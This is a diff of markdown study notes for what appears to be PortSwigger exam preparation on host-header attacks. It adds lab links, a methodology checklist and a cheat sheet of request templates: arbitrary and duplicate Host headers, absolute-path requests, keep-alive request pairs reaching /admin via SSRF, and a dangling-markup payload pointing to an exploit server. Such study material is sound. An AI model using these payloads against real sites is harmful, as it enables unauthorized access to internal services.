@@ -3,42 +3,39 @@
 ```bash
 - Param Miner extension
 	  -> guess: headers, params, body, everything!
-- 
 ```
 
 ## Most important labs
 
-- [1]()
+- [Host-header-injection-via-web-cache-poisoning+xss](host-header-injection-via-web-cache-poisoning+xss.md)
 
-- [2]()
+- [SSRF via arbitraty host + EXTRA lab: absolute path](SSRF-via-arbitraryhost-and-absolute-path.md)
 
-- [3]()
-
-- [4]()
+- [SSRF-via-host-validation-bypass-via-connection-state-attack](SSRF-via-host-validation-bypass-via-connection-state-attack.md)
 
 
 ## Metodology
 
-❗ Important: To avoid wasting time during the exam, PortSwigger warns that if an SSRF exists it will always be reachable at **IP-BRUTE-FORCE** on **port 6566**. 
+❗ Important: To avoid wasting time during the exam, PortSwigger warns that if an SSRF exists it will always be reachable at **localhost** on **port 6566**. 
 
 ```bash
 - Discover allowed headers with Param Miner
 - Try Arbitrary Host
 - Only local users? 
 	  -> localhost
-	  -> SSRF (in exam always port 6566)
-- Check fir flawed validation -> 
+	  -> SSRF 
 - Inject duplicate host header -> blocked? -> indent.
 - Intruder -> !! disable update host to match !! 
-- Try absloute path in GET = ignore malicious host
-- Try inject in port after port : delimeter   
-- 2 request in a single connection
+- Try absloute path in GET = ignore malicious host 
+- Send 2 request in a single connection -> 1 valid + 2 with SSRF
+- Try inject in port after port delimeter : delimeter  
 ```
 
 ## Cheat Sheet
 
 ```bash
-# ARBITRARY HOST
+# ARBITRARY HOST / TRY FIRST INSERT COLLABORATOR PAYLOAD 
+GET /admin
 Host: <VULNERABLE-WEB>:<OUR-SV>||<LOCALHOST-SSRF>
 # DUPLICATE HOST / SWITCH ORDER
 GET /example HTTP/1.1
@@ -55,8 +52,18 @@ X-Forwarded-Host: <OUR-SV>||<LOCALHOST-SSRF>
 # ABSOLUTE PATH = IGNORE HOST 
 GET <ABSOLUTE_PATH>            
 Host: <OUR-SV>||<LOCALHOST-SSRF>
-# IN PORT (MEJORAR)
-Host: <VULNERABLE-WEB>:<OUR-SV>||<LOCALHOST-SSRF>
+# MULTIPLE REQUEST IN A SINGLE CONNECTION
+## REQUEST 1
+GET /
+Host: <VALID-HOST>
+Connection: keep-alive
+## REQUEST 2
+GET /admin
+Host: <VULNERABLE-WEB>:<OUR-SV>|
+Connection: keep-alive
+# AFTER PORT : DELIMETER - DANGLING MARKUP
+GET /
+Host: <YOUR-LAB>:'<a href="//<EXPLOIT-SV>/?
 ```
 
 > DIFFERENT WAYS TO WRITE LOCALHOST   
